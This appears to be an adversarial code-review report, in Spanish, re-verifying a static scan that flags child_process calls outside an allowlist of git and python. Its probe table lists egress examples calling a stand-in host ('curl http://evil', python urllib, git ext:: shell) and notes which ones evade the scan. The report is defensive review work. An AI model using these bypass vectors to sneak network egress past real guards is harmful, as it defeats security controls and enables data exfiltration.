# ANALISTA - TASK-0153 (re-verificacion: external-cli denylist -> ALLOWLIST {git,python})

> Voz analista independiente (checker adversarial). maker=Codex / checker=Arquitecto / esta voz = adversarial.
> Re-verificacion del fix que YO pedi en la pasada previa (external-cli denylist sobre child_process).
> Ancla canonico: Zeus-protocol `5cb8910` + protocolo HEAD `15e66a1` (origin==HEAD).
> Metodo: clon LIMPIO `C:\tmp\zeus-0153b` checkout 5cb8910 (no in-place); `node --test` corrido por mi;
> probe de COMPORTAMIENTO con replica verbatim de la funcion pura `sourceEgressViolations`. Gateo por EXIT.

## Veredicto de cabecera

**CERRABLE (recomiendo cerrar) con UN RESIDUAL NUEVO declarado (no bloqueante) + recomendacion falsable.**
El escape que probe en la pasada previa (execFile/spawn de un binario externo no listado) esta CERRADO:
external-cli paso a ALLOWLIST de binarios spawneados {git,python} y marca TODO lo demas, confirmado por
comportamiento (powershell/sh/bash/cmd/curl/wget Y los hints node/deno/pwsh/nc/paths-absolutos -> FLAGGED;
git/python -> []; src real -> []). NO hallé un binario spawneado que aun escape al allowlist.

Hallé un vector NUEVO de la MISMA familia (shell-exec), que declaro como RESIDUAL inherente, NO como bloqueo,
por las razones de abajo: **`child_process.exec` / `execSync` (shell-string) NO estan en `cliPattern`** (solo
execFile/execFileAsync/execFileSync/spawn/spawnSync), asi que `exec("curl http://evil")` escapa. Tambien los
DOS binarios allowlisted son gadgets de ejecucion arbitraria (`python -c <codigo>`, `git clone ext::`/fetch-URL).

## Por que es RESIDUAL y no bloqueo (honesto, falsable)

1. **El fix cumple su alcance declarado** (marcar execFile*/spawn* con binario fuera de {git,python}) y cierra
   por comportamiento el escape que levante. Eso era lo pedido.
2. **El gap exec/execSync NO tiene fix limpio name-based.** Un `\bexec\s*\(` ingenuo COLISIONA con
   `RegExp.prototype.exec`, que el src real USA legitimamente (`src/canonicalReader.js:229` y `:243` ->
   `/regex/.exec(line)`). Verificado: esos son regex.exec, no child_process. Un fix preciso exige conciencia
   de binding de import o AST -> es la misma clase inherente que el residual de ofuscacion ya declarado.
3. **Los binarios allowlisted son gadgets de egress inevitables.** El producto DEBE llamar `execFile("python",
   ["-c", ...])` (drift/attest/validate) y `execFile("git", ...)` (push). `python -c` ejecuta codigo arbitrario
   y `git` puede fetchear de URLs / `ext::` -> ningun scan estatico sobre un interprete allowlisted prueba
   "cero egress". La garantia HONESTA del guard es "sin egress por un binario spawneado NO listado", y ESA se
   cumple. "Cero egress" seguira siendo overstated mientras python/git esten (y deben estar).
4. **El aislamiento REAL del egress en uso vivo NO es este scan** (es regresion-proof, no sandbox): es el
   extractor deterministic-local (cero red) + el GO de encendido APARTE del operador. Off-by-default intacto.

## Evidencia (reproducida por mi)

- Clon limpio Zeus `5cb8910`. `node --test`: 44/44 exit 0 (sin flake en la corrida).
- Gates protocolo (HEAD 15e66a1): validate_collaboration_state exit 0; scan_domain_neutrality exit 0;
  scan_encoding exit 0. #4 byte-identica (cambio test-only en Zeus; protocol.config/genesis/registry/keys sin tocar).
- Probe de comportamiento (replica verbatim de la funcion pura):

| Vector | Resultado | Lectura |
|---|---|---|
| execFile("powershell",...IWR) | FLAGGED external-cli:powershell | escape previo CERRADO |
| spawn("sh",["-c","curl..."]) | FLAGGED external-cli:sh | CERRADO |
| spawn("bash"/cmd/curl/wget) | FLAGGED external-cli | CERRADO |
| execFile("node"/"deno"/"pwsh"/"nc") | FLAGGED external-cli | hints del Arquitecto: marcados |
| execFile("/bin/sh"), ("C:/.../cmd.exe") | FLAGGED external-cli | paths absolutos: marcados |
| execFile("git",...) , execFile("python",...) | [] | sin falso positivo (allowlist) |
| src real (src/**) | [] | la suite lo asierta; no rompe build |
| **import {exec}; exec("curl http://evil")** | **ESCAPES []** | exec/execSync fuera de cliPattern |
| **import {execSync}; execSync("pwsh -c iwr...")** | **ESCAPES []** | idem |
| **promisify(exec)("curl...")** | **ESCAPES []** | idem |
| python -c urllib.urlopen("http://evil") | ESCAPES [] | gadget allowlisted (inevitable) |
| git clone "ext::sh -c curl" | ESCAPES [] | gadget allowlisted (inevitable) |

- Carry: import allowlist (phin/axios -> unallowlisted-import), eval/new Function -> dynamic-exec, import
  permitido -> [], AC47 aislamiento de env, Fase A/B/C -> verdes dentro de las 44.

## RECOMENDACION DE CIERRE

**OK -> CERRABLE.** El cambio cierra el escape que motivo el rework y cumple su alcance; el resto es la clase
inherente (gadgets allowlisted + colision name-based). Recomiendo (no bloqueante) registrar el RESIDUAL y, como
follow-up del GO de USO VIVO (no de este cierre), una narrowing barata y SIN falso positivo: **marcar el IMPORT
de `exec`/`execSync` desde `node:child_process`** (el src real solo importa `{execFile, spawn}` -> cero FP; cierra
el `exec("curl")` en el sitio del import). La cobertura total (namespace import + `.exec(` computed, python-c,
git-ext) queda como el limite declarado del scan estatico -> allowlist/AST o, mejor, el extractor
deterministic-local como gate real del egress en vivo.

## RIESGO DECLARADO

- No promuevo, no muto estado, no enciendo nada vivo. El cierre lo decide el Arquitecto (DECISION-0056).
- Si el operador prefiere cerrar el `exec`/`execSync` antes de ESTE cierre, es 1 linea de import-binding (no
  el `\bexec\(` ingenuo, que rompe regex.exec del src real). Mi recomendacion es cerrar ahora y tratarlo como
  precondicion del USO VIVO, junto al python-c/git-ext, porque el gate real del egress vivo es el extractor.
